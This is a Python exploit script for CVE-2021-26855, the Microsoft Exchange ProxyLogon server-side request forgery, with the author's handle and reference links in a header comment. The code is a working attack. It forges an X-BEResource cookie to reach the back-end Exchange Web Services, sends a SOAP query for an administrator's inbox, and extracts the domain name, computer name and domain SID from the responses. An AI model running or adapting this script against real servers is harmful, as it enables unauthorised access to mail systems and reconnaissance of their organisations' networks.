CVE-2021-26855.py

'''
Author: Udyz
Referral:
- https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-26855.yaml
- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
- https://proxylogon.com
[*] CVE-2021-26855 SSRF Exchange Server
'''
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def exploit(url):
	try:
		print('[*] Target: %s'%url)
		server = url + '/owa/auth.owa'
		#data_server = "destination=https%3A%2F%2Fnothing%2Fowa%2F&flags=4&forcedownlevel=0&username=pentest&password=pentest'&passwordText=&isUtf8=1"
		#print(data_server)
		req = requests.post(server, verify=False)
		if not req.status_code == 400:
			print('[-] Target is not Vuln!')
			exit(0)
		server_name = req.headers["X-FEServer"]
		print('[*] Getting FQDN Name: %s'%(server_name))
		path_maybe_vuln = ['/owa/auth/Current/themes/resources/logon.css','/owa/auth/Current/themes/resources/owafont_ja.css','/owa/auth/Current/themes/resources/lgnbotl.gif','/owa/auth/Current/themes/resources/owafont_ko.css','/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot','/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf','/owa/auth/Current/themes/resources/lgnbotl.gif','/owa/auth/Current/', '/ecp/default.flt', '/ecp/main.css']
		headers = {
		'User-Agent': 'Hello-World',
		'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
		'Connection': 'close',
		'Content-Type': 'text/xml'
		}
		payload = """<?xml version='1.0' encoding='utf-8'?>
			<soap:Envelope
			 xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
			 xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
			 xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
			 xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
			  <soap:Header>
			      <t:RequestServerVersion Version="Exchange2016" />
			  </soap:Header>
			  <soap:Body>
			    <m:FindItem Traversal='Shallow'>
			      <m:ItemShape>
			        <t:BaseShape>AllProperties</t:BaseShape>
			      </m:ItemShape>
			      <m:ParentFolderIds>
			        <t:DistinguishedFolderId Id='inbox'>
			          <t:Mailbox>
			            <t:EmailAddress>admin@domail.local</t:EmailAddress>
			          </t:Mailbox>
			        </t:DistinguishedFolderId>
			      </m:ParentFolderIds>
			    </m:FindItem>
			  </soap:Body>
			</soap:Envelope>
		"""
		for x in path_maybe_vuln:
			reqs = requests.post('%s/%s' %(url,x),headers=headers,data=payload, verify=False)
			if 'MessageText' in reqs.text:
				print('(+) Path %s is vuln to CVE-2021-26855!'%x)
				print('(*) Getting Information Server')
				#print(reqs.headers)
				print('[+] Domain Name = %s'%reqs.headers["X-DiagInfo"])
				print('[+] Computer Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
				print('[+] Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
				break
			elif 'The specified server version is invalid.' in reqs.text:
				print('(+) Path %s is vuln to CVE-2021-26855!'%x)
				print('(+) Response: The specified server version is invalid.')
				print('(*) Getting Information Server')
				#print(reqs.headers)
				print('[+] Domain Name =  %s'%reqs.headers["X-DiagInfo"])
				print('[+] Computer Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
				print('[+] Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
				#i dont know what is that ;V
				exit(0)
			else:
				print('(-) Path %s is not vuln to CVE-2021-26855!'%x)
	except Exception as e:
		print(e)
		pass
if(len(sys.argv) < 2):
	print('[*] CVE-2021-26855 SSRF Exchange Server\n./%s <https://url>\n'%(sys.argv[0]))
	exit(0)

exploit(sys.argv[1])